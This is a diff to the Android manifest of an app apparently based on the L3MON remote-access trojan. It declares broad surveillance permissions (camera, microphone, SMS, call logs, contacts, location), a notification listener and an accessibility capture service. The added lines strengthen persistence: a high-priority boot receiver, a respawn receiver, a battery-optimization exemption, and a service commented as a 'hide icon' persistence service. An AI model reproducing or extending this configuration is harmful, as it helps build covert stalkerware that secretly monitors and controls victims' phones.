@@ -2,17 +2,21 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.etechd.l3mon">
 
-    <!-- Permissions -->
+    <!-- ==================== PERMISSIONS ==================== -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+
+    <!-- Permissões adicionais (mantidas do original) -->
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
-    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.SEND_SMS" />
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
-    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
@@ -20,8 +24,6 @@
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.READ_CONTACTS" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-    <uses-permission android:name="android.permission.ACCESSIBILITY_SERVICE" />
 
     <application
         android:allowBackup="true"
@@ -32,36 +34,31 @@
         android:supportsRtl="true"
         android:theme="@style/AppTheme">
 
-        <activity android:name=".MainActivity" android:launchMode="singleInstance">
+        <!-- ==================== ACTIVITY ==================== -->
+        <activity
+            android:name=".MainActivity"
+            android:launchMode="singleInstance"
+            android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
 
-        <service android:name=".MainService" android:enabled="true" android:exported="false" />
-
-        <receiver android:name=".ServiceReciever" android:enabled="true" android:exported="true">
-            <intent-filter>
-                <action android:name="respawnService" />
-            </intent-filter>
-        </receiver>
-
-        <receiver android:name=".MyReceiver" android:enabled="true" android:exported="true">
-            <intent-filter>
-                <action android:name="android.intent.action.BOOT_COMPLETED" />
-            </intent-filter>
-        </receiver>
-
+        <!-- ==================== SERVICES ==================== -->
         <service
-            android:name=".NotificationListener"
-            android:label="@string/app_name"
-            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
-            <intent-filter>
-                <action android:name="android.service.notification.NotificationListenerService" />
-            </intent-filter>
-        </service>
+            android:name=".MainService"
+            android:enabled="true"
+            android:exported="false"
+            android:stopWithTask="false" />
 
+        <!-- Serviço de Persistência (Hide Icon + Foreground) -->
+        <service
+            android:name=".AccessibilityCaptureService$HideIconBackgroundService"
+            android:enabled="true"
+            android:exported="false" />
+
+        <!-- Accessibility Services -->
         <service
             android:name=".AccessibilityCaptureService"
             android:enabled="true"
@@ -86,6 +83,39 @@
             <meta-data
                 android:name="android.accessibilityservice"
                 android:resource="@xml/l3mon_accessibility_config" />
+        </service>
+
+        <!-- ==================== RECEIVERS ==================== -->
+        <!-- Boot Receiver (Melhorado) -->
+        <receiver
+            android:name=".MyReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter android:priority="1000">
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Service Respawn Receiver -->
+        <receiver
+            android:name=".ServiceReciever"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="respawnService" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Outros serviços -->
+        <service
+            android:name=".NotificationListener"
+            android:label="@string/app_name"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
         </service>
 
     </application>
